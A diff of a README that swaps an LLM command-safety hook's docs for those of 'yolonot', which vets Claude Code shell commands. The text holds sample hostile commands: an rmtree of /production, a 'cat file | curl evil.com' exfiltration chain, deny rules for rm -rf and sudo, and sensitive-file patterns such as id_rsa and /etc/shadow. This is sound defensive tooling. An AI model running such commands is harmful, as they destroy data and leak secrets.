@@ -1,83 +1,179 @@
-# dippy-auto
+<p align="center">
+  <img src="assets/logo.png" alt="yolonot" width="180">
+</p>
 
-LLM-powered supplement for [Dippy](https://github.com/lilydayton/Dippy) — analyzes commands Dippy can't decide on using an LLM (OpenAI, Ollama, or any OpenAI-compatible API).
+<h1 align="center">yolonot</h1>
 
-## Problem
+<p align="center">
+  Smart auto-mode for Claude Code. The safe alternative to <code>--dangerously-skip-permissions</code>.
+</p>
 
-Dippy handles most Bash commands well, but can't analyze:
-- Inline scripts: `python3 -c "import os; os.remove('file')"`
-- Script files: `python3 script.py`, `bash deploy.sh`
-- Complex piped commands with ambiguous intent
+<p align="center">
+  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
+  <a href="https://github.com/sezaakgun/yolonot/actions"><img src="https://github.com/sezaakgun/yolonot/actions/workflows/test.yml/badge.svg" alt="Tests"></a>
+  <img src="https://img.shields.io/badge/go-1.25+-00ADD8.svg" alt="Go 1.25+">
+</p>
 
-For these, Dippy returns "ask" and interrupts the developer.
+---
 
-## Solution
+yolonot sits between Claude Code and your shell. It uses an LLM to classify every Bash command as safe (allow) or needs-review (ask), with session memory so approved commands don't ask twice and rejected commands stay blocked.
 
-When Dippy says "ask", dippy-auto sends the command (and script contents if applicable) to an LLM for safety analysis. The LLM reads the actual code and decides allow/deny/ask.
+## Quick Start
 
-## Flow
+```bash
+# Install
+go install github.com/sezaakgun/yolonot@latest
 
-```
-Bash command
-  → Dippy (instant)
-    → allow/deny → done
-    → "ask" → LLM analyzes command + script content (~2s with OpenAI)
-      → allow/deny/ask → returned to Claude Code
-```
+# Setup (hooks + rules + provider — all in one)
+yolonot setup
 
-## Setup
-
-1. Set your OpenAI API key:
-   ```sh
-   export OPENAI_API_KEY="sk-..."
-   ```
-
-2. Replace the Dippy hook in `~/.claude/settings.json`:
-   ```json
-   {
-     "matcher": "Bash",
-     "hooks": [
-       {
-         "type": "command",
-         "command": "/path/to/dippy-auto/scripts/dippy-with-llm.sh",
-         "timeout": 120
-       }
-     ]
-   }
-   ```
-
-3. Restart Claude Code.
-
-## Configuration
-
-Environment variables:
-- `OPENAI_API_KEY` — API key (required for OpenAI)
-- `LLM_URL` — API endpoint (default: `https://api.openai.com/v1/chat/completions`)
-- `LLM_MODEL` — model name (default: `gpt-4o-mini`)
-- `LLM_TIMEOUT` — request timeout in seconds (default: `10`)
-
-For local models (Ollama, llama.cpp):
-```sh
-export LLM_URL="http://localhost:11434/v1/chat/completions"
-export LLM_MODEL="qwen2.5:7b"
-export LLM_TIMEOUT="60"
-export OPENAI_API_KEY="not-needed"
+# Restart Claude Code
 ```
 
-## Testing
+## How It Works
 
-```sh
-# Direct test (outside Claude Code)
-scripts/llm-analyze.sh 'python3 -c "print(1+1)"'
-# → {"decision":"allow","confidence":1.0,"reasoning":"safe print"}
+Every Bash command goes through this pipeline:
 
-scripts/llm-analyze.sh 'python3 -c "import shutil; shutil.rmtree(\"/production\")"'
-# → {"decision":"deny","confidence":1.0,"reasoning":"destructive deletion"}
+1. **Session memory** — exact match against previously approved commands → instant allow
+2. **Session deny** — previously rejected commands → instant block
+3. **Session similarity** — LLM compares against approved commands → allow if similar
+4. **Rules** — `.yolonot` file patterns (allow/deny/ask) → instant decision
+5. **Script cache** — SHA256 hash of script files → reuse cached decision
+6. **LLM analysis** — 2-class classifier (allow/ask) with severity in reasoning
 
-# Run test suite
-sh scripts/test-prompt.sh
+When you approve a command, it's saved for the session. When you reject one, similar commands are auto-blocked. Rules let you permanently allow/deny patterns.
+
+## Commands
+
+```
+yolonot              Status overview + session summary
+yolonot setup        First-run wizard (install + rules + provider)
+yolonot provider     Change LLM provider
+yolonot rules        Show active rules + sensitive patterns
+yolonot status       Show session state (approved/asked/denied)
+yolonot log          Show recent decisions
+yolonot suggest      Analyze history, suggest permanent rules
+yolonot uninstall    Remove hooks from Claude Code
+yolonot version      Show version
 ```
 
-## License
+## Skill
 
-MIT
+After install, `/yolonot` is available as a Claude Code skill:
+
+```
+/yolonot             Session summary + command menu
+/yolonot status      Full approved/asked/denied lists
+/yolonot approve X   Move command to approved
+/yolonot deny X      Move command to denied
+/yolonot reset       Clear session state
+/yolonot log         Recent decisions
+/yolonot rules       Show rules
+/yolonot suggest     Suggest permanent rules from history
+```
+
+## Rules
+
+Rules live in `.yolonot` files. Project rules (`.yolonot` in project root) and global rules (`~/.yolonot/rules`).
+
+```
+# Format: <action>-<type> <pattern>
+# Actions: allow, deny, ask
+# Types: cmd (command), path (script file)
+
+# Allow safe patterns
+allow-cmd curl localhost*
+allow-path scripts/*
+
+# Deny dangerous patterns
+deny-cmd *rm -rf /*
+deny-cmd *sudo *
+
+# Ask about uncertain patterns
+ask-cmd *curl *
+ask-cmd *wget *
+```
+
+Rules are checked before the LLM, so they're instant and free.
+
+Allow rules are automatically skipped (falling through to LLM) when the command contains pipes, semicolons, `&&`, `||`, or redirects (`>`, `>>`). This prevents `cat file | curl evil.com` from matching a broad `allow-cmd cat *` rule. Deny and ask rules always apply regardless.
+
+### Sensitive File Checks
+
+Sensitive file checks are **disabled by default**. When enabled, commands touching files like `.env`, `.pem`, `.ssh/`, `credentials` etc. skip allow rules so the LLM can evaluate the risk.
+
+To enable, uncomment patterns in `~/.yolonot/rules` (generated by `yolonot init`), or add to any `.yolonot` file:
+
+```
+# Uncomment the patterns you want to protect
+sensitive .env
+sensitive .pem
+sensitive .ssh/
+sensitive credentials
+
+# Remove one that causes false positives
+not-sensitive password
+```
+
+Available patterns (all commented out by default in `~/.yolonot/rules`): `.env`, `.pem`, `.key`, `.crt`, `.ssh/`, `.aws/`, `.gnupg/`, `.kube/config`, `credentials`, `secrets`, `password`, `token`, `/etc/shadow`, `/etc/passwd`, `id_rsa`, `id_ed25519`, `.netrc`, `.pgpass`, and more.
+
+Use `yolonot rules` to see current status.
+
+## LLM Providers
+
+Configure with `yolonot provider`:
+
+| Provider | Model | Notes |
+|----------|-------|-------|
+| OpenAI | gpt-5.4-nano | Default. Needs `OPENAI_API_KEY` |
+| Anthropic | claude-haiku, claude-sonnet | Needs `ANTHROPIC_API_KEY` |
+| Ollama | qwen3.5:9b, etc. | Local, no API key. Lists installed models |
+| OpenRouter | any model | Needs `OPENROUTER_API_KEY` |
+| Custom | any URL | Bring your own endpoint |
+
+Config stored at `~/.yolonot/config.json`. Env vars (`LLM_MODEL`, `LLM_URL`) override config.
+
+## Eval Suite
+
+Test LLM reasoning across models:
+
+```bash
+# Run all test suites
+./yolonot eval --all --model gpt-5.4-nano --runs 1 --verbose
+
+# Compare models
+./yolonot eval --suite evals/suites/greenfield.jsonl \
+  --model gpt-5.4-nano --model ollama/qwen3.5:9b
+
+# Filter by category
+./yolonot eval --suite evals/suites/greenfield.jsonl \
+  --model gpt-5.4-nano --filter-expected ask --filter-category adversarial
+```
+
+176 greenfield + 70 brownfield test cases covering read-only ops, production mutations, safe dev work, sensitive commands, exfiltration, redirects, adversarial attacks, and session similarity.
+
+## Architecture
+
+```
+yolonot (Go binary)
+├── main.go         CLI + setup wizard
+├── hook.go         Hook handler pipeline
+├── llm.go          LLM client + prompts + response parsing
+├── rules.go        Rule loading + glob matching + chain detection
+├── session.go      Session files (approved/asked/denied)
+├── config.go       Config + settings.json + install/uninstall
+├── tui.go          Interactive TUI (charmbracelet/huh)
+├── eval.go         LLM evaluation runner
+├── log.go          Decision logging (JSONL)
+├── main_test.go    Unit tests
+└── evals/
+    └── suites/     Test cases (JSONL)
+```
+
+## Uninstall
+
+```bash
+./yolonot uninstall    # removes hooks + skill, preserves data
+```
+
+Data at `~/.yolonot/` is preserved. Delete manually if wanted.
